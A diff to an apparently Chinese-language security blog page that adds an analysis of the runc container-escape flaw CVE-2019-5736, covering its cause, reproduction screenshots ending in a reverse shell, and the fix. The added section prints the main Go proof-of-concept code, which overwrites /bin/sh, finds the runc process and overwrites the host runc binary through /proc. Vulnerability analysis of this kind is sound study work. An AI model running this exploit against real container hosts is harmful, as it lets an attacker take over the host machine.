@@ -477,14 +477,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    4.7k
+                    6.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    19 Min
+                    25 Min
                 </div>
                 
 
@@ -875,7 +875,168 @@ namespace;之前init子进程被“唤醒”,用ptrace注入代码.最后攻击�
 <p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2012%2013%2037%2039%201668231459%201668231459815%20ryArGg%20image-20221112133739719%20.png" alt="image-20221112133739719" style="zoom:50%;"></p>
 <p>总的来说,这个漏洞的攻击过程还是相当复杂的,内部有许多系统底层细节有关的知识,难度也是挺大的,我还有一些地方至今也未能完全明白.</p>
 <h2 id="cve-2019-5736">2. CVE-2019-5736</h2>
+<h3 id="漏洞原理">1) 漏洞原理</h3>
+<p>结合对源代码的简要分析,简而言之,<code>runc run或者runc exec</code>的过程可以分为如下几步:</p>
+<p>runc会创建一个<code>runc init</code>的子进程,创建的关键细节如下:</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go">cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"/proc/self/exe"</span><span class="token punctuation">,</span> <span class="token string">"init"</span><span class="token punctuation">)</span>
+cmd<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+cmd<span class="token punctuation">.</span>Stdin <span class="token operator">=</span> p<span class="token punctuation">.</span>Stdin
+cmd<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> p<span class="token punctuation">.</span>Stdout
+cmd<span class="token punctuation">.</span>Stderr <span class="token operator">=</span> p<span class="token punctuation">.</span>Stderr
+cmd<span class="token punctuation">.</span>Dir <span class="token operator">=</span> c<span class="token punctuation">.</span>config<span class="token punctuation">.</span>Rootfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>也就是说<code>runc init</code>子进程是通过<code>/proc/self/exec</code>为蓝本,在加额外的一个命令行参数<code>init</code>创建的一个子进程.</p>
+<blockquote>
+<p><strong>/proc伪文件系统</strong></p>
+<p>/proc伪文件系统是保存在内存上的,而非disk,通过该文件系统可以对一个系统中运行中的进程进行观察,可以访问一些与某进程相关的内核数据结构等等.比如说在某个命名空间下的一个进程pid,那么可以通过/proc/[pid]/所在的目录之下,观察到与该进程相关的信息.</p>
+<p><strong>/proc/self/exe</strong></p>
+<p>我们可以通过/proc/[pid]/exc获取到该进程对应的二进制文件.相对于一般的符号链接,有一些不同.内核不会像其他的符号连接一样通过解析文件路径的方式去检索该文件,而是有专门的处理函数处理并直接返回其文件描述符.<strong>可以跨越mount_namespaces带来的限制</strong>.</p>
+</blockquote>
+<p>通过上面知识的补充,我们可以知道,即使runc
+init再后来会进行mount_namespaces的隔离设置,但借助<code>/proc/self/exe</code>仍然可以绕过这些限制,获取到runc对应的二进制文件.</p>
+<p>此外,<code>runc init</code>最终会落实到下面的命令:</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword keyword-if">if</span> err <span class="token operator">:=</span> system<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> l<span class="token punctuation">.</span>config<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span><span class="token function">Environ</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+    <span class="token keyword keyword-return">return</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"can't exec user process: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+<span class="token keyword keyword-return">return</span> <span class="token boolean">nil</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最终仅仅是调用了<code>system.Exec</code>,对<code>runc init</code>进程的内容进行替换.</p>
+<p>总的来说runc的过程就如图(图片引用自<a target="_blank" rel="noopener" href="https://liuliuliuzy.github.io/">zyleo's Blog</a>)所示:</p>
+<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2013%2046%2010%201668577570%201668577570984%20vWKz9Q%20image-20221116134610837%20.png" alt="image-20221116134610837" style="zoom:50%;"></p>
+<p>因此,如果能使得<code>system.Exec</code>执行的仍然是<code>/proc/self/exe</code>,然后在该容器中就可以从/proc伪文件系统下检索到“/proc/self/exe”对应的进程,然后就可以通过/proc获取到runc程序对应的文件句柄,执行修改操作,修改成我们想要运行的恶意程序,当runc在此被运行时,就会运行我们构造的恶意程序,达成攻击效果.</p>
+<blockquote>
+<p><strong>为什么非得在容器中运行一个runc程序,而非在execve中直接获取/proc/self/exe并进行修改呢?</strong></p>
+<p>这一点我比较疑惑.</p>
+</blockquote>
+<h3 id="poc程序分析">2) poc程序分析</h3>
+<h4 id="重写binsh">(1) 重写/bin/sh</h4>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span>
+fd<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>
+<span class="token keyword keyword-if">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+    <span class="token keyword keyword-return">return</span>
+<span class="token punctuation">}</span>
+fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"#!/proc/self/exe"</span><span class="token punctuation">)</span>
+err <span class="token operator">=</span> fd<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword keyword-if">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+    <span class="token keyword keyword-return">return</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>此时,我们已经处于容器之中,以上做的是将“/bin/sh”二进制文件的内容重写成“#!/proc/self/exe”.修改之后,运行“/bin/sh”时就会运行“/proc/self/exe”对应的二进制文件.此操作的目的在于,我们需要在该容器内在运行出一个<code>runc</code>进程,一旦用户执行<code>docker(runc) exec ... /bin/sh</code>,就会在容器里运行一个runc进程.</p>
+<h4 id="轮询proc找到runc进程">(2) 轮询/proc找到runc进程</h4>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword keyword-var">var</span> found <span class="token builtin">int</span>
+<span class="token keyword keyword-for">for</span> found <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>
+    pids<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadDir</span><span class="token punctuation">(</span><span class="token string">"/proc"</span><span class="token punctuation">)</span>
+    <span class="token keyword keyword-if">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+        <span class="token keyword keyword-return">return</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword keyword-for">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> f <span class="token operator">:=</span> <span class="token keyword keyword-range">range</span> pids <span class="token punctuation">{</span>
+        fbytes<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/proc/"</span> <span class="token operator">+</span> f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/cmdline"</span><span class="token punctuation">)</span>
+        fstring <span class="token operator">:=</span> <span class="token function">string</span><span class="token punctuation">(</span>fbytes<span class="token punctuation">)</span>
+        <span class="token keyword keyword-if">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>fstring<span class="token punctuation">,</span> <span class="token string">"runc"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Found the PID:"</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            found<span class="token punctuation">,</span> err <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword keyword-if">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+                fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+                <span class="token keyword keyword-return">return</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这一段代码的目的在于,轮询/proc,当知道cmdline前缀有“runc”的为止.</p>
+<blockquote>
+<p><strong>/proc/[pid]/cmdline</strong></p>
+<p>表示的是该进程的命令行参数,相当于argv的内容.</p>
+</blockquote>
+<h4 id="获取procpidexe对应的文件句柄并修改">(3)
+获取/proc/[pid]/exe对应的文件句柄并修改</h4>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go">    <span class="token comment">// We will use the pid to get a file handle for runc on the host.</span>
+    <span class="token keyword keyword-var">var</span> handleFd <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
+    <span class="token keyword keyword-for">for</span> handleFd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">{</span>
+        <span class="token comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span>
+        handle<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"/proc/"</span><span class="token operator">+</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/exe"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span>
+        <span class="token keyword keyword-if">if</span> <span class="token function">int</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>
+            handleFd <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Successfully got the file handle"</span><span class="token punctuation">)</span>
+
+    <span class="token comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span>
+    <span class="token comment">// It will maintain it's executable flag</span>
+    <span class="token keyword keyword-for">for</span> <span class="token punctuation">{</span>
+        writeHandle<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"/proc/self/fd/"</span><span class="token operator">+</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>handleFd<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_WRONLY<span class="token operator">|</span>os<span class="token punctuation">.</span>O_TRUNC<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span>
+        <span class="token keyword keyword-if">if</span> <span class="token function">int</span><span class="token punctuation">(</span>writeHandle<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>
+            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Successfully got write handle"</span><span class="token punctuation">,</span> writeHandle<span class="token punctuation">)</span>
+            writeHandle<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword keyword-return">return</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>打开<code>/proc/[pid]/exe</code>,返回其文件描述符,然后将payload的内容写到该文件里的,也就完成了对runc程序的修改,之后在运行runc程序,就会出发payload.</p>
+<h3 id="复现过程">3) 复现过程</h3>
+<ol type="1">
+<li>首先运行一个容器.</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2053%2021%201668588801%201668588801496%20xujZrf%20image-20221116165321361%20.png" alt="image-20221116165321361">
+<figcaption aria-hidden="true">image-20221116165321361</figcaption>
+</figure>
+<ol start="2" type="1">
+<li>然后将main.go(poc)程序编译好之后拷贝到容器中</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2054%2011%201668588851%201668588851269%20REQ25Y%20image-20221116165411177%20.png" alt="image-20221116165411177">
+<figcaption aria-hidden="true">image-20221116165411177</figcaption>
+</figure>
+<ol start="3" type="1">
+<li>攻击方监听某个端口准备就绪.</li>
+</ol>
+<p><img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2040%2045%201668588045%201668588045279%20fIBSgS%20image-20221116164045188%20.png" alt="image-20221116164045188" style="zoom: 67%;"></p>
+<ol start="4" type="1">
+<li>运行poc程序</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2055%2004%201668588904%201668588904187%20aE71Lk%20image-20221116165504096%20.png" alt="image-20221116165504096">
+<figcaption aria-hidden="true">image-20221116165504096</figcaption>
+</figure>
+<ol start="5" type="1">
+<li>等待exec /bin/sh的执行</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2057%2055%201668589075%201668589075403%20pxPe7f%20image-20221116165755304%20.png" alt="image-20221116165755304">
+<figcaption aria-hidden="true">image-20221116165755304</figcaption>
+</figure>
+<ol start="6" type="1">
+<li>反弹shell建立</li>
+</ol>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2058%2033%201668589113%201668589113794%20lTCGwk%20image-20221116165833693%20.png" alt="image-20221116165833693">
+<figcaption aria-hidden="true">image-20221116165833693</figcaption>
+</figure>
+<p>攻击方执行一些命令:</p>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2047%2018%201668588438%201668588438952%20rSRtD8%20image-20221116164718848%20.png" alt="image-20221116164718848">
+<figcaption aria-hidden="true">image-20221116164718848</figcaption>
+</figure>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2016%2047%2035%201668588455%201668588455527%20iAx2ok%20image-20221116164735411%20.png" alt="image-20221116164735411">
+<figcaption aria-hidden="true">image-20221116164735411</figcaption>
+</figure>
+<p>攻击成功.</p>
+<h3 id="漏洞修复">4) 漏洞修复</h3>
+<p>其修补方式在于当<code>runc init</code>进程进入到容器命名空间之前,首先将<code>/proc/self/exe</code>复制到内存中,使得当前<code>/proc/self/exe</code>所指向的文件句柄是复制的匿名文件,而非宿主机上的runc文件.</p>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2017%2046%2014%201668591974%201668591974298%20gcopKo%20image-20221116174614170%20.png" alt="image-20221116174614170">
+<figcaption aria-hidden="true">image-20221116174614170</figcaption>
+</figure>
+<figure>
+<img src="https://yfspicturebad1-1309550486.cos.ap-nanjing.myqcloud.com/uPic/2022%2011%2016%2017%2046%2040%201668592000%201668592000839%20pVRkcI%20image-20221116174640734%20.png" alt="image-20221116174640734">
+<figcaption aria-hidden="true">image-20221116174640734</figcaption>
+</figure>
+<p>这样即使使用同样的方式进行攻击,也不会对宿主机上的runc程序产生任何影响.</p>
 <h2 id="reference">Reference</h2>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UZ7VdGSUGSvoo-6GVl53qg">容器逃逸成真：从CTF解题到CVE-2019-5736漏洞挖掘分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://liuliuliuzy.github.io/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#runc%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E7%9A%84%E8%BF%87%E7%A8%8B">Docker
+runc(CVE-2019-5736)漏洞分析-第三版</a></p>
 
                 
             </div>
